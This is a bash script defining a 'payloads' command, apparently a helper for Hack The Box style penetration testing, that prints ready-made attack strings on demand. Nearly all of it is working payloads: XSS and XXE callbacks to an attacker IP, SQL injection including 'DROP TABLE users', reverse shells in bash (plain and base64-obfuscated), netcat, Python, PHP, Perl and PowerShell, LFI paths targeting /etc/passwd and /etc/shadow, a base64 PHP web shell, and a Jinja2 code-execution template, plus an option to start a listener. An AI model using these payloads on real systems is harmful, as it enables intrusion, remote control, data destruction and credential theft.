#!/bin/bash

_payload_get_ip() {
    local ip="${1:-$(htbip 2>/dev/null)}"
    [[ -z "$ip" ]] && ip="YOUR_IP"
    echo "$ip"
}

_payload_xss() {
    local tag="${1:-img}"
    local port="${2:-4444}"
    local ip="$(_payload_get_ip "$3")"
    local path="xss_${tag}"
    
    case "$tag" in
        img)
            echo "<img src=\"http://${ip}:${port}/${path}\">"
            ;;
        img-onerror)
            echo "<img src=x onerror=\"fetch('http://${ip}:${port}/${path}')\">"
            ;;
        script)
            echo "<script src=\"http://${ip}:${port}/${path}\"></script>"
            ;;
        script-fetch)
            echo "<script>fetch('http://${ip}:${port}/${path}')</script>"
            ;;
        svg)
            echo "<svg onload=\"fetch('http://${ip}:${port}/${path}')\">"
            ;;
        iframe)
            echo "<iframe src=\"http://${ip}:${port}/${path}\"></iframe>"
            ;;
        body)
            echo "<body onload=\"fetch('http://${ip}:${port}/${path}')\">"
            ;;
        input)
            echo "<input onfocus=\"fetch('http://${ip}:${port}/${path}')\" autofocus>"
            ;;
        csp-script)
            echo "<script src=\"${ip}:${port}\"></script>"
            ;;
        csp-meta)
            echo "<meta http-equiv=\"refresh\" content=\"0; url=http://${ip}:${port}/${path}\">"
            ;;
        csp-link)
            echo "<link rel=stylesheet href=\"http://${ip}:${port}/${path}\">"
            ;;
        csp-base)
            echo "<base href=\"http://${ip}:${port}/\">"
            ;;
        csp-iframe)
            echo "<iframe src=\"http://${ip}:${port}/${path}\"></iframe>"
            ;;
        csp-form)
            echo "<form action=\"http://${ip}:${port}/${path}\" method=\"POST\"><input type=\"submit\" value=\"Click\"></form>"
            ;;
        csp-object)
            echo "<object data=\"http://${ip}:${port}/${path}\"></object>"
            ;;
        *)
            echo "<img src=\"http://${ip}:${port}/${path}\">"
            ;;
    esac
}

_payload_sqli() {
    local type="${1:-union}"
    
    case "$type" in
        union)
            echo "' UNION SELECT NULL,NULL,NULL--"
            ;;
        union-dump)
            echo "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--"
            ;;
        error)
            echo "' AND 1=CONVERT(int,(SELECT @@version))--"
            ;;
        boolean)
            echo "' AND '1'='1"
            ;;
        time)
            echo "' AND SLEEP(5)--"
            ;;
        stacked)
            echo "'; DROP TABLE users--"
            ;;
        *)
            echo "' OR 1=1--"
            ;;
    esac
}

_payload_rce() {
    local type="${1:-bash}"
    local ip="$(_payload_get_ip "$2")"
    local port="${3:-4444}"
    
    case "$type" in
        bash)
            echo "bash -i >& /dev/tcp/${ip}/${port} 0>&1"
            ;;
        bash-b64)
            local cmd="bash -i >& /dev/tcp/${ip}/${port} 0>&1"
            echo "echo $(echo -n "$cmd" | base64) | base64 -d | bash"
            ;;
        nc)
            echo "nc ${ip} ${port} -e /bin/bash"
            ;;
        nc-mkfifo)
            echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ${ip} ${port} >/tmp/f"
            ;;
        python)
            echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${ip}\",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
            ;;
        php)
            echo "php -r '\$sock=fsockopen(\"${ip}\",${port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
            ;;
        perl)
            echo "perl -e 'use Socket;\$i=\"${ip}\";\$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"
            ;;
        powershell)
            echo "\$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
            ;;
        *)
            echo "bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'"
            ;;
    esac
}

_payload_lfi() {
    local type="${1:-basic}"
    local file="${2:-/etc/passwd}"
    
    case "$type" in
        basic)
            echo "../../../../${file}"
            ;;
        null)
            echo "../../../../${file}%00"
            ;;
        double)
            echo "....//....//....//....//${file}"
            ;;
        wrapper-php)
            echo "php://filter/convert.base64-encode/resource=${file}"
            ;;
        wrapper-data)
            echo "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
            ;;
        wrapper-expect)
            echo "expect://id"
            ;;
        *)
            echo "../../../${file}"
            ;;
    esac
}

_payload_xxe() {
    local ip="$(_payload_get_ip "$1")"
    local port="${2:-4444}"
    
    cat <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://${ip}:${port}/xxe_poc"> ]>
<root>
  <data>&xxe;</data>
</root>
EOF
}

_payload_ssti() {
    local type="${1:-jinja2}"
    
    case "$type" in
        jinja2)
            echo "{{7*7}}"
            ;;
        jinja2-rce)
            echo "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
            ;;
        twig)
            echo "{{7*'7'}}"
            ;;
        freemarker)
            echo "\${7*7}"
            ;;
        velocity)
            echo "#set(\$x=7*7)\$x"
            ;;
        *)
            echo "{{7*7}}"
            ;;
    esac
}

payloads() {
    local type="" tag="" port="" ip="" file="" path="" listen=false all_tags=false
    
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --type|-t) type="$2"; shift 2 ;;
            --tag) tag="$2"; shift 2 ;;
            --port|-p) port="$2"; shift 2 ;;
            --ip) ip="$2"; shift 2 ;;
            --file|-f) file="$2"; shift 2 ;;
            --path) path="$2"; shift 2 ;;
            --listen|-l) listen=true; shift ;;
            --all|-a) all_tags=true; shift ;;
            --help|-h)
                cat <<EOF
Usage: payloads --type <TYPE> [OPTIONS]

Types:
  xss          XSS payloads
  sqli         SQL injection
  rce          Remote code execution
  lfi          Local file inclusion
  xxe          XML external entity
  ssti         Server-side template injection

XSS Options:
  --tag        Tag type: img, img-onerror, script, script-fetch, svg, iframe, body, input, csp-script, csp-meta, csp-link, csp-base, csp-iframe, csp-form, csp-object
  --all        Print all XSS tags at once
  --port       Port (default: 4444)
  --ip         IP address (default: htbip)
  --path       Path (default: xss_poc)
  --listen     Start nc listener on port

RCE Options:
  --tag        Shell type: bash, bash-b64, nc, nc-mkfifo, python, php, perl, powershell
  --port       Port (default: 4444)
  --ip         IP address (default: htbip)
  --listen     Start nc listener on port

LFI Options:
  --tag        Type: basic, null, double, wrapper-php, wrapper-data, wrapper-expect
  --file       File to read (default: /etc/passwd)

SQLi Options:
  --tag        Type: union, union-dump, error, boolean, time, stacked

SSTI Options:
  --tag        Engine: jinja2, jinja2-rce, twig, freemarker, velocity

XXE Options:
  --port       Port (default: 4444)
  --ip         IP address (default: htbip)
  --listen     Start nc listener on port

Examples:
  payloads --type xss --tag img --port 4444 --listen
  payloads --type rce --tag bash --port 4444 --listen
  payloads --type sqli --tag union
  payloads --type lfi --tag wrapper-php --file /etc/shadow
EOF
                return 0
                ;;
            *) echo "Unknown option: $1"; return 1 ;;
        esac
    done
    
    [[ -z "$type" ]] && { echo "Usage: payloads --type <TYPE> [OPTIONS] (use --help for details)"; return 1; }
    
    # Set default ports based on type if not specified
    if [[ -z "$port" ]]; then
        case "$type" in
            xss|xxe) port="4444" ;;
            rce) port="4444" ;;
            *) port="" ;;
        esac
    fi
    
    local payload=""
    case "$type" in
        xss)
            if [[ "$all_tags" == true ]]; then
                local tags=("img" "img-onerror" "script" "script-fetch" "svg" "iframe" "body" "input" "csp-script" "csp-meta" "csp-link" "csp-base" "csp-iframe" "csp-form" "csp-object")
                for t in "${tags[@]}"; do
                    echo "$(_payload_xss "$t" "$port" "$ip")"
                done
                return 0
            else
                payload=$(_payload_xss "$tag" "$port" "$ip" "$path")
            fi
            ;;
        sqli)
            payload=$(_payload_sqli "$tag")
            ;;
        rce)
            payload=$(_payload_rce "$tag" "$ip" "$port")
            ;;
        lfi)
            payload=$(_payload_lfi "$tag" "$file")
            ;;
        xxe)
            payload=$(_payload_xxe "$ip" "$port")
            ;;
        ssti)
            payload=$(_payload_ssti "$tag")
            ;;
        *)
            echo "Unknown type: $type"
            return 1
            ;;
    esac
    
    echo "$payload"
    
    if [[ "$listen" == true && -n "$port" ]]; then
        echo ""
        echo "[*] Starting listener on port $port..."
        ncstart "$port" tcp "payload_${type}_${port}"
    fi
}
